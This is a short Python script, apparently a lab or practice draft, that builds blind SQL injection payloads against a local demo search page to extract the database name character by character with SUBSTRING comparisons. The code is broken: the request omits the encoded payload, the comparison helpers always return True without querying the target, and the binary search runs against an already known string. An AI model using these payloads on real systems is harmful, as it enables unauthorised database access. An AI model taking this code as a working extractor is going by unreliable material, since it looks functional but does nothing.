import requests
import urllib.parse
url = "http://192.168.1.3/demo/search.php?user=alice"


url = "http://192.168.1.3/demo/search.php"
params = {
    "user": "alice' AND (SELECT SUBSTRING((SELECT DATABASE()), 1,1)) = 'd"
}

encoded_params = urllib.parse.urlencode(params)
final_url = f"{url}?{encoded_params}"

print(final_url)

response = requests.get(url)

print(response.status_code)
print(response.text)
print(response.url)







def greater(idx, ch):
    param = f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) > '{ch}"
    return True

def lower(idx, ch):
    param = f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) < '{ch}"
    return True

def eq(name):
    param = f"alice' AND (SELECT DATABASE()) = '{name}"
    return True

def binary_search_char(target, alphabet):
    lo, hi = 0, len(alphabet) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        if alphabet[mid] == target:
            return alphabet[mid]
        elif alphabet[mid] < target:
            lo = mid + 1
        else:
            hi = mid - 1
    return None


def guess_string(secret):
    alphabet = [chr(i) for i in range(128)]   # ASCII 0–127
    result = ""

    for ch in secret:
        guessed = binary_search_char(ch, alphabet)
        result += guessed if guessed is not None else "?"
    return result


# Example usage:
secret = "Hello!"
print(guess_string(secret))   # → "Hello!"
